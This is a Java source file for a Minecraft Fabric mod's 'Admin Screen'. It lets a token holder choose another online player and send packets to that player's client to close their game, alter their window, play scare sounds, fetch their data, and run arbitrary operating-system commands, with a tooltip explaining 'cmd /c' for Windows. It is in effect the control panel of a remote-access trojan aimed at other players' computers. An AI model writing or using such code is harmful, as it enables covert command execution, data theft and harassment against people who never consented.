package de.hallotheengineer.tarret.client.gui;

import com.mojang.serialization.Codec;
import de.hallotheengineer.tarret.client.SoundPlayer;
import de.hallotheengineer.tarret.client.TarretClient;
import de.hallotheengineer.tarret.networking.packet.DataType;
import de.hallotheengineer.tarret.networking.packet.ScareType;
import de.hallotheengineer.tarret.networking.packet.SoundType;
import de.hallotheengineer.tarret.networking.packet.c2s.*;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.minecraft.client.gui.tooltip.Tooltip;
import net.minecraft.client.gui.widget.*;
import net.minecraft.client.option.GameOptions;
import net.minecraft.client.option.SimpleOption;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

@Environment(EnvType.CLIENT)
public class AdminScreen extends AdministrationScreen {
    public AdminScreen() {
        super(Text.literal("Admin Screen"));
    }

    public CyclingButtonWidget<String> playerList;
    public ButtonWidget reloadWidget;
    public ButtonWidget resetAccessToken;
    public ButtonWidget closeMinecraft;
    public ButtonWidget updateTitle;
    public TextFieldWidget newTitle;
    public ButtonWidget toggleFullscreen;
    public ButtonWidget limitFPS;
    public SimpleOption<Integer> newFPS;
    public ButtonWidget executeCommand;
    public TextFieldWidget command;
    public ButtonWidget fetchData;
    public CyclingButtonWidget<DataType> dataType;
    public ButtonWidget resizeWindow;
    public TextFieldWidget newWidth;
    public TextFieldWidget newHeight;
    public ButtonWidget scareButton;
    public CyclingButtonWidget<ScareType> scareType;
    public CyclingButtonWidget<SoundType> soundType;
    public ButtonWidget testSoundButton;
    public List<String> players;
    public List<ClickableWidget> scareDataWidgets;

    @Override
    protected void init() {
        int w = client.getWindow().getScaledWidth();
        int h = client.getWindow().getScaledHeight();

        int vw = w/9;
        int vh = h/5;
        scareDataWidgets = new ArrayList<>();

        playerList = CyclingButtonWidget.builder(Text::literal).initially(players.get(0)).values(players).build(w/2-50,h/9, 100, 20, Text.literal("Player").formatted(Formatting.GREEN));
        addDrawableChild(playerList);

        reloadWidget = ButtonWidget.builder(Text.literal("🔁"), this::onReload).dimensions(w/2+55, h/9, 20, 20).tooltip(Tooltip.of(Text.literal("Click to reload server players").formatted(Formatting.GREEN))).build();
        addDrawableChild(reloadWidget);

        resetAccessToken = ButtonWidget.builder(Text.literal("❌"), this::onResetToken).dimensions(w/2+80, h/9, 20, 20).tooltip(Tooltip.of(Text.literal("Click to reset access token").formatted(Formatting.GREEN))).build();
        addDrawableChild(resetAccessToken);

        closeMinecraft = ButtonWidget.builder(Text.literal("Close Minecraft"), this::onCloseMinecraft).dimensions(vw, vh, 100, 20).build();
        addDrawableChild(closeMinecraft);

        updateTitle = ButtonWidget.builder(Text.literal("Update Window Title"), this::onEditTitle).dimensions(vw, vh+25, 100, 20).build();
        addDrawableChild(updateTitle);

        newTitle = new TextFieldWidget(client.textRenderer, vw+105, vh+25, 100, 20, Text.literal("New Title"));
        addDrawableChild(newTitle);

        toggleFullscreen = ButtonWidget.builder(Text.literal("Toggle Fullscreen"), this::onToggleFullscreen).dimensions(vw, vh+50, 100, 20).build();
        addDrawableChild(toggleFullscreen);

        limitFPS = ButtonWidget.builder(Text.literal("Limit FPS"), this::onLimitFPS).dimensions(vw, vh+75, 100, 20).build();
        addDrawableChild(limitFPS);

        newFPS = new SimpleOption<>("button.tarret.fps", SimpleOption.emptyTooltip(), GameOptions::getGenericValueText, new SimpleOption.ValidatingIntSliderCallbacks(0, 165), Codec.DOUBLE.xmap(value -> (int) (value * 40.0 + 70.0), value -> ((double) value - 70.0) / 40.0), 75, integer -> {});
        addDrawableChild(newFPS.createWidget(client.options, vw+105, vh+75, 100));

        executeCommand = ButtonWidget.builder(Text.literal("Execute Cmd"), this::onExecuteCommand).dimensions(vw, vh+100, 100, 20).tooltip(Tooltip.of(Text.literal("Use ").append(Text.literal("cmd /c <Command>").formatted(Formatting.GREEN)).append(Text.literal(" to execute command in windows.")))).build();
        addDrawableChild(executeCommand);

        command = new TextFieldWidget(client.textRenderer, vw+105, vh+100, 100, 20, Text.literal("Command to execute"));
        addDrawableChild(command);

        fetchData = ButtonWidget.builder(Text.literal("Fetch Data"), this::fetchData).dimensions(vw, vh+125, 100, 20).build();
        addDrawableChild(fetchData);

        dataType = CyclingButtonWidget.<DataType>builder(o -> Text.literal(o.displayName)).initially(DataType.values()[0]).values(DataType.values()).build(vw+105, vh+125, 100, 20, Text.literal("Type"));
        addDrawableChild(dataType);

        resizeWindow = ButtonWidget.builder(Text.literal("Resize Window"), this::onResizeWindow).dimensions(vw, vh+150, 100, 20).build();
        addDrawableChild(resizeWindow);

        newWidth = new TextFieldWidget(client.textRenderer, vw+105, vh+150, 48, 20, Text.literal("New window width"));
        newWidth.setTextPredicate(AdminScreen::isInteger);
        addDrawableChild(newWidth);

        newHeight = new TextFieldWidget(client.textRenderer, vw+157, vh+150, 48, 20, Text.literal("New window height"));
        newHeight.setTextPredicate(AdminScreen::isInteger);
        addDrawableChild(newHeight);

        scareButton = ButtonWidget.builder(Text.literal("Scare"), this::onScare).dimensions(vw*5, vh, 100, 20).build();
        addDrawableChild(scareButton);

        scareType = CyclingButtonWidget.<ScareType>builder(o -> Text.literal(o.displayName)).initially(ScareType.values()[0]).values(ScareType.values()).build(vw*5+105, vh, 100, 20, Text.literal("Type"), this::onScareTypeChange);
        addDrawableChild(scareType);

        soundType = CyclingButtonWidget.<SoundType>builder(o -> Text.literal(o.displayName)).initially(SoundType.values()[0]).values(SoundType.values()).build(vw*5+10, vh+25, 100, 20, Text.literal("Sound"));
        addDrawableChild(soundType);

        testSoundButton = ButtonWidget.builder(Text.literal("▶"), this::onTestSound).dimensions(vw*5+115, vh+25, 20, 20).tooltip(Tooltip.of(Text.literal("Tests the selected sound!").formatted(Formatting.GREEN))).build();
        addDrawableChild(testSoundButton);

        collectScareOptions();
        onScareTypeChange(scareType, scareType.getValue());
    }

    private void onTestSound(ButtonWidget buttonWidget) {
        SoundPlayer.playSound(soundType.getValue().fileName);
    }

    private void onScareTypeChange(CyclingButtonWidget<ScareType> scareTypeCyclingButtonWidget, ScareType scareType) {
        hideAllScareOptions();
        switch (scareType) {
            case SCARY_ALERT -> {

            }
            case SOUND_ALERT -> {
                soundType.visible = true;
                testSoundButton.visible = true;
            }
        }
    }
    private String getScareData() {
        if (Objects.requireNonNull(scareType.getValue()) == ScareType.SOUND_ALERT) {
            return soundType.getValue().fileName;
        }
        return "";
    }

    private void onScare(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new ScareC2SPacket(TarretClient.currentAccessToken, playerList.getValue(), scareType.getValue(), getScareData())));
    }

    private void onResizeWindow(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new ResizeWindowC2SPacket(TarretClient.currentAccessToken, playerList.getValue(), Integer.parseInt(newWidth.getText()), Integer.parseInt(newHeight.getText()))));
    }

    private void onResetToken(ButtonWidget buttonWidget) {
        TarretClient.currentAccessToken = null;
        client.setScreen(null);
    }

    private void fetchData(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new RequestDataC2SPacket(TarretClient.currentAccessToken, playerList.getValue(), dataType.getValue())));
        buttonWidget.active = false;
    }

    private void onExecuteCommand(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new ExecuteCommandC2SPacket(TarretClient.currentAccessToken, playerList.getValue(), command.getText())));
    }

    private void onLimitFPS(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new LimitFPSC2SPacket(TarretClient.currentAccessToken, playerList.getValue(), newFPS.getValue())));
    }

    private void onToggleFullscreen(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new ToggleFullscreenC2SPacket(TarretClient.currentAccessToken, playerList.getValue())));
    }

    private void onReload(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new RequestOnlinePlayersC2SPacket(TarretClient.currentAccessToken)));
    }

    private void onEditTitle(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new EditWindowTitleC2SPacket(TarretClient.currentAccessToken, playerList.getValue(), newTitle.getText())));
    }

    private void onCloseMinecraft(ButtonWidget buttonWidget) {
        client.execute(() -> ClientPlayNetworking.send(new CloseMinecraftC2SPacket(TarretClient.currentAccessToken, playerList.getValue())));
    }

    private void hideAllScareOptions() {
        scareDataWidgets.forEach(clickableWidget -> clickableWidget.visible = false);
    }
    private void collectScareOptions() {
        scareDataWidgets.add(soundType);
        scareDataWidgets.add(testSoundButton);
    }

    public static boolean isInteger(String str) {
        if (str == null) {
            return false;
        }
        int length = str.length();
        if (length == 0) {
            return false;
        }
        int i = 0;
        if (str.charAt(0) == '-') {
            if (length == 1) {
                return false;
            }
            i = 1;
        }
        for (; i < length; i++) {
            char c = str.charAt(i);
            if (c < '0' || c > '9') {
                return false;
            }
        }
        return true;
    }
}
